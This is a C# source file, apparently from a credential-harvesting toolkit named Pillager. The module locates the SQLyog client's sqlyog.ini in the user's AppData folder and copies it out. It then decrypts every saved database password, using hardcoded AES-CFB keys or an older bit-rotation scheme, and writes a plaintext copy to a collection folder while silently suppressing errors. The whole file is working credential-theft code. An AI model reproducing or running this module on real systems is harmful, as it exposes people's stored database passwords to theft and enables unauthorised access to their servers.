using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using Pillager.Helper;

namespace Pillager.Tools
{
    internal class SQLyog : ICommand
    {
        private byte[] keyArray = { 0x29, 0x23, 0xBE, 0x84, 0xE1, 0x6C, 0xD6, 0xAE, 0x52, 0x90, 0x49, 0xF1, 0xC9, 0xBB, 0x21, 0x8F };
        private byte[] ivArray = { 0xB3, 0xA6, 0xDB, 0x3C, 0x87, 0x0C, 0x3E, 0x99, 0x24, 0x5E, 0x0D, 0x1C, 0x06, 0xB7, 0x47, 0xDE };
        private string OldDecrypt(string text)
        {
            byte[] bytes = Convert.FromBase64String(text);
            for (int i = 0; i < bytes.Length; i++)
            {
                bytes[i] = ((byte)(((bytes[i]) << (1)) | ((bytes[i]) >> (8 - (1)))));
            }
            return Encoding.UTF8.GetString(bytes);
        }

        private string NewDecrypt(string text)
        {
            byte[] bytes = Convert.FromBase64String(text);
            byte[] bytespad = new byte[128];
            Array.Copy(bytes, bytespad, bytes.Length);
            RijndaelManaged rDel = new RijndaelManaged();
            rDel.Key = keyArray;
            rDel.IV = ivArray;
            rDel.BlockSize = 128;
            rDel.Mode = CipherMode.CFB;
            rDel.Padding = PaddingMode.None;
            ICryptoTransform cTransform = rDel.CreateDecryptor();
            byte[] resultArray = cTransform.TransformFinalBlock(bytespad, 0, bytespad.Length).Take(bytes.Length).ToArray();
            return Encoding.UTF8.GetString(resultArray);
        }

        private string Decrypt(string path)
        {
            Pixini p = Pixini.Load(path);
            Dictionary<string, List<IniLine>> sectionMap = p.sectionMap;
            foreach (var item in sectionMap)
            {
                List<IniLine> iniLines = item.Value;
                bool encrypted = false;
                string encryptedpassword = "";
                foreach (var line in iniLines)
                {
                    if (line.key == "Password")
                        encryptedpassword = line.value;
                    if (line.key == "Isencrypted") encrypted = (line.value == "1");
                }
                if (string.IsNullOrEmpty(encryptedpassword)) continue;
                string password = encrypted ? NewDecrypt(encryptedpassword) : OldDecrypt(encryptedpassword);
                p.Set("Password", item.Key, password);
            }
            return p.ToString();
        }


        public override void Save(string path)
        {
            try
            {
                string inipath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "SQLyog\\sqlyog.ini");
                if (!File.Exists(inipath)) return;
                string savepath = Path.Combine(path, "SQLyog");
                Directory.CreateDirectory(savepath);
                File.Copy(inipath, Path.Combine(savepath, "sqlyog.ini"));
                File.WriteAllText(Path.Combine(savepath, "sqlyog_decrypted.ini"), Decrypt(inipath), Encoding.UTF8);
            }
            catch { }
        }
    }
}
